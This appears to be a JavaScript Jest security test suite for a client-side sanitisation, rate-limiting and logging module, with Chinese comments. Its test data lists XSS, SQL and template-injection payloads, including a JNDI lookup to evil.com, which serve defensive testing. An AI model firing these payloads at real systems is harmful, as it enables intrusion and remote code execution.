/**
 * Security Test Suite: Lightweight Security Architecture
 * Requirement: R-2.4 安全架構輕量化
 * Design: D-3.1 Security Layer (Lightweight)
 * Tasks: T-SECURITY-01, T-SECURITY-02, T-SECURITY-03
 * Security Focus: OWASP Top 10, Input Validation, XSS Prevention
 */

describe('Lightweight Security - Security Tests', () => {
  let securityCore;
  let securityToggle;
  let healthMonitor;

  beforeEach(() => {
    // Reset instances
    LightweightSecurityCore._instance = null;
    
    // Mock DOM and localStorage
    global.document = {
      querySelector: jest.fn(),
      createElement: jest.fn(() => ({ httpEquiv: '', content: '' })),
      head: { appendChild: jest.fn() }
    };
    global.localStorage = {
      getItem: jest.fn(() => null),
      setItem: jest.fn()
    };
    global.console = { log: jest.fn(), error: jest.fn(), warn: jest.fn() };
    global.window = { LightweightSecurityCore };

    securityCore = LightweightSecurityCore.getInstance();
    securityToggle = new StaticHostingSecurityToggle();
    healthMonitor = new ClientSideSecurityHealthMonitor();
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  // TC-SEC-001: XSS 防護測試 (OWASP A03:2021)
  describe('XSS Prevention (OWASP A03:2021)', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="alert(1)">',
      'javascript:alert("xss")',
      '<svg onload="alert(1)">',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<body onload="alert(1)">',
      '<div onclick="alert(1)">click</div>',
      '<input onfocus="alert(1)" autofocus>',
      '<select onfocus="alert(1)" autofocus>',
      '<textarea onfocus="alert(1)" autofocus>'
    ];

    test.each(xssPayloads)('should sanitize XSS payload: %s', (payload) => {
      const result = LightweightSecurityCore.validateInput(payload);
      
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('<script>');
      expect(result.sanitized).not.toContain('javascript:');
      expect(result.sanitized).not.toMatch(/on\w+=/i);
      expect(result.sanitized).not.toContain('<iframe');
      expect(result.sanitized).not.toContain('<svg');
      expect(result.sanitized).not.toContain('<img');
    });

    test('should escape HTML entities correctly', () => {
      const htmlEntities = [
        { input: '<', expected: '&lt;' },
        { input: '>', expected: '&gt;' },
        { input: '&', expected: '&amp;' },
        { input: '"', expected: '&quot;' },
        { input: "'", expected: '&#x27;' },
        { input: '<script>alert("xss")</script>', expected: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;' }
      ];

      htmlEntities.forEach(({ input, expected }) => {
        const result = LightweightSecurityCore.escapeHtml(input);
        expect(result).toBe(expected);
      });
    });

    test('should handle nested XSS attempts', () => {
      const nestedXss = '<div><script>alert("nested")</script><img src="x" onerror="alert(2)"></div>';
      const result = LightweightSecurityCore.validateInput(nestedXss);
      
      expect(result.valid).toBe(true);
      expect(result.sanitized).not.toContain('<script>');
      expect(result.sanitized).not.toContain('onerror=');
    });

    test('should record XSS attempts in health monitor', () => {
      const xssPayload = '<script>alert("xss")</script>';
      
      LightweightSecurityCore.validateInput(xssPayload);
      healthMonitor.recordEvent('xssAttempts', { input: xssPayload });
      
      const status = healthMonitor.getHealthStatus();
      expect(status.metrics.xssAttempts).toBe(1);
    });
  });

  // TC-SEC-002: 注入攻擊防護測試 (OWASP A03:2021)
  describe('Injection Attack Prevention', () => {
    const injectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'/*",
      "' UNION SELECT * FROM users --",
      "${jndi:ldap://evil.com/a}",
      "{{7*7}}",
      "<%= 7*7 %>",
      "#{7*7}",
      "javascript:void(0)",
      "data:text/html,<script>alert(1)</script>"
    ];

    test.each(injectionPayloads)('should handle injection payload: %s', (payload) => {
      const result = LightweightSecurityCore.validateInput(payload);
      
      // Should either sanitize or reject dangerous payloads
      if (result.valid) {
        expect(result.sanitized).not.toContain('javascript:');
        expect(result.sanitized).not.toContain('data:text/html');
      }
    });

    test('should prevent template injection', () => {
      const templatePayloads = [
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        '<%= system("id") %>',
        '#{T(java.lang.Runtime).getRuntime().exec("calc")}'
      ];

      templatePayloads.forEach(payload => {
        const result = LightweightSecurityCore.validateInput(payload);
        expect(result.valid).toBe(true);
        // Should not contain dangerous template syntax
        expect(result.sanitized).not.toMatch(/\{\{.*\}\}/);
        expect(result.sanitized).not.toMatch(/\$\{.*\}/);
        expect(result.sanitized).not.toMatch(/<%.*%>/);
        expect(result.sanitized).not.toMatch(/#\{.*\}/);
      });
    });
  });

  // TC-SEC-003: 輸入驗證安全測試 (OWASP A04:2021)
  describe('Input Validation Security', () => {
    test('should enforce maximum input length', () => {
      const longInput = 'a'.repeat(1001);
      const result = LightweightSecurityCore.validateInput(longInput);
      
      expect(result.valid).toBe(false);
      expect(result.sanitized).toBe('');
    });

    test('should handle null and undefined inputs securely', () => {
      const nullResult = LightweightSecurityCore.validateInput(null);
      const undefinedResult = LightweightSecurityCore.validateInput(undefined);
      
      expect(nullResult.valid).toBe(false);
      expect(nullResult.sanitized).toBe('');
      expect(undefinedResult.valid).toBe(false);
      expect(undefinedResult.sanitized).toBe('');
    });

    test('should handle non-string inputs securely', () => {
      const inputs = [123, {}, [], true, false, Symbol('test')];
      
      inputs.forEach(input => {
        const result = LightweightSecurityCore.validateInput(input);
        expect(result.valid).toBe(false);
        expect(result.sanitized).toBe('');
      });
    });

    test('should validate input length boundaries', () => {
      const exactLimitInput = 'a'.repeat(1000);
      const overLimitInput = 'a'.repeat(1001);
      
      expect(LightweightSecurityCore.validateInput(exactLimitInput).valid).toBe(true);
      expect(LightweightSecurityCore.validateInput(overLimitInput).valid).toBe(false);
    });

    test('should handle Unicode and special characters safely', () => {
      const unicodeInputs = [
        '🚀💻🔒', // Emojis
        'café', // Accented characters
        '中文测试', // Chinese characters
        'العربية', // Arabic characters
        'русский', // Cyrillic characters
        '\u0000\u0001\u0002', // Control characters
        '\uFEFF', // BOM character
        '\u200B\u200C\u200D' // Zero-width characters
      ];

      unicodeInputs.forEach(input => {
        const result = LightweightSecurityCore.validateInput(input);
        expect(result.valid).toBe(true);
        expect(result.sanitized).toBeDefined();
      });
    });
  });

  // TC-SEC-004: 速率限制安全測試 (OWASP A04:2021)
  describe('Rate Limiting Security', () => {
    beforeEach(() => {
      jest.useFakeTimers();
    });

    afterEach(() => {
      jest.useRealTimers();
    });

    test('should prevent brute force attacks', () => {
      const results = [];
      
      // Simulate brute force attempt
      for (let i = 0; i < 150; i++) {
        results.push(securityCore.checkRateLimit('bruteforce'));
      }
      
      const allowedRequests = results.filter(r => r).length;
      const blockedRequests = results.filter(r => !r).length;
      
      expect(allowedRequests).toBe(100);
      expect(blockedRequests).toBe(50);
    });

    test('should handle rapid successive requests', () => {
      const startTime = Date.now();
      
      // Make 200 rapid requests
      const results = [];
      for (let i = 0; i < 200; i++) {
        results.push(securityCore.checkRateLimit('rapid'));
      }
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Should complete quickly and enforce limits
      expect(duration).toBeLessThan(100);
      expect(results.filter(r => r).length).toBe(100);
      expect(results.filter(r => !r).length).toBe(100);
    });

    test('should reset rate limits after time window', () => {
      // Exhaust rate limit
      for (let i = 0; i < 100; i++) {
        securityCore.checkRateLimit('reset-test');
      }
      expect(securityCore.checkRateLimit('reset-test')).toBe(false);
      
      // Advance time beyond window
      jest.advanceTimersByTime(61000);
      
      // Should allow requests again
      expect(securityCore.checkRateLimit('reset-test')).toBe(true);
    });

    test('should isolate rate limits by operation type', () => {
      // Exhaust limit for operation A
      for (let i = 0; i < 100; i++) {
        securityCore.checkRateLimit('operationA');
      }
      
      // Operation A should be blocked
      expect(securityCore.checkRateLimit('operationA')).toBe(false);
      
      // Operation B should still be allowed
      expect(securityCore.checkRateLimit('operationB')).toBe(true);
    });
  });

  // TC-SEC-005: 日誌安全測試 (OWASP A09:2021)
  describe('Logging Security', () => {
    test('should prevent log injection attacks', () => {
      const logInjectionPayloads = [
        'Normal log\nINJECTED: Fake admin login',
        'User input\r\nFAKE ERROR: System compromised',
        'Test\n\rINJECTED LOG ENTRY',
        'Input\x00NULL_BYTE_INJECTION',
        'Test\u2028LINE_SEPARATOR_INJECTION',
        'Input\u2029PARAGRAPH_SEPARATOR_INJECTION'
      ];

      logInjectionPayloads.forEach(payload => {
        LightweightSecurityCore.log('info', payload);
        
        // Check that console.log was called with escaped content
        const logCall = console.log.mock.calls.find(call => 
          call[1] && call[1].message
        );
        
        if (logCall) {
          const loggedMessage = logCall[1].message;
          expect(loggedMessage).not.toContain('\n');
          expect(loggedMessage).not.toContain('\r');
          expect(loggedMessage).not.toContain('\x00');
          expect(loggedMessage).not.toContain('\u2028');
          expect(loggedMessage).not.toContain('\u2029');
        }
      });
    });

    test('should escape HTML in log messages', () => {
      const htmlPayload = '<script>alert("log injection")</script>';
      LightweightSecurityCore.log('info', htmlPayload);
      
      const logCall = console.log.mock.calls.find(call => 
        call[1] && call[1].message
      );
      
      expect(logCall[1].message).toBe('&lt;script&gt;alert(&quot;log injection&quot;)&lt;/script&gt;');
    });

    test('should handle large log messages safely', () => {
      const largeMessage = 'A'.repeat(10000);
      
      expect(() => {
        LightweightSecurityCore.log('info', largeMessage);
      }).not.toThrow();
      
      const logCall = console.log.mock.calls.find(call => 
        call[1] && call[1].message
      );
      
      expect(logCall[1].message).toBeDefined();
      expect(logCall[1].message.length).toBeGreaterThan(0);
    });
  });

  // TC-SEC-006: 設定安全測試
  describe('Configuration Security', () => {
    test('should validate CSP configuration', () => {
      const cspContent = LightweightSecurityCore._config.csp;
      
      // Should contain essential security directives
      expect(cspContent).toContain("default-src 'self'");
      expect(cspContent).toContain("script-src 'self'");
      expect(cspContent).toContain("style-src 'self'");
      expect(cspContent).toContain("img-src 'self' data: https:");
      
      // Should not contain unsafe directives
      expect(cspContent).not.toContain("'unsafe-eval'");
      expect(cspContent).not.toContain("script-src *");
      expect(cspContent).not.toContain("object-src *");
    });

    test('should protect against configuration tampering', () => {
      const originalConfig = LightweightSecurityCore._config;
      
      // Attempt to modify configuration
      try {
        LightweightSecurityCore._config = { malicious: true };
      } catch (error) {
        // Expected to fail due to private field
      }
      
      // Configuration should remain unchanged
      expect(LightweightSecurityCore._config).toBe(originalConfig);
    });

    test('should validate security toggle settings', () => {
      const toggle = new StaticHostingSecurityToggle();
      
      // Should not allow invalid feature names
      expect(toggle.toggle('invalidFeature', true)).toBe(false);
      expect(toggle.toggle(null, true)).toBe(false);
      expect(toggle.toggle(undefined, true)).toBe(false);
      
      // Should only accept boolean values
      toggle.toggle('csp', 'true');
      expect(toggle.isEnabled('csp')).toBe(true); // Converted to boolean
      
      toggle.toggle('csp', 0);
      expect(toggle.isEnabled('csp')).toBe(false); // Converted to boolean
    });
  });

  // TC-SEC-007: 記憶體安全測試
  describe('Memory Safety', () => {
    test('should prevent memory leaks in health monitoring', () => {
      const monitor = new ClientSideSecurityHealthMonitor();
      
      // Generate many alerts
      for (let i = 0; i < 1000; i++) {
        monitor.triggerAlert('xssAttempts', i);
      }
      
      // Should limit memory usage by keeping only recent alerts
      expect(monitor.alerts.length).toBe(10);
      
      const status = monitor.getHealthStatus();
      expect(status.alerts.length).toBe(5); // Returns only last 5
    });

    test('should handle rate limit data cleanup', () => {
      // Generate rate limit data for many operations
      for (let i = 0; i < 1000; i++) {
        securityCore.checkRateLimit(`operation${i}`);
      }
      
      // Should not cause memory issues
      expect(securityCore.rateLimitData.size).toBe(1000);
      
      // In a real implementation, old entries would be cleaned up
      // This test verifies the system can handle many operations
    });
  });

  // TC-SEC-008: 錯誤處理安全測試
  describe('Error Handling Security', () => {
    test('should not expose sensitive information in errors', () => {
      const sensitiveData = {
        password: 'secret123',
        token: 'abc123xyz',
        apiKey: 'key_12345'
      };
      
      // Mock localStorage to throw error with sensitive data
      global.localStorage.setItem = jest.fn(() => {
        throw new Error(`Failed to save: ${JSON.stringify(sensitiveData)}`);
      });
      
      const toggle = new StaticHostingSecurityToggle();
      toggle.toggle('csp', false);
      
      // Should log warning but not expose sensitive data
      expect(console.warn).toHaveBeenCalledWith(
        '[SecurityToggle] Failed to save settings:',
        expect.any(Error)
      );
      
      // The error object itself might contain sensitive data,
      // but it should not be logged in plain text
    });

    test('should handle DOM manipulation errors gracefully', () => {
      global.document.createElement = jest.fn(() => {
        throw new Error('DOM manipulation failed');
      });
      
      expect(() => {
        securityCore.setupCSP();
      }).not.toThrow();
    });

    test('should handle JSON parsing errors securely', () => {
      global.localStorage.getItem = jest.fn(() => 'invalid json{');
      
      expect(() => {
        new StaticHostingSecurityToggle();
      }).not.toThrow();
      
      expect(console.warn).toHaveBeenCalled();
    });
  });
});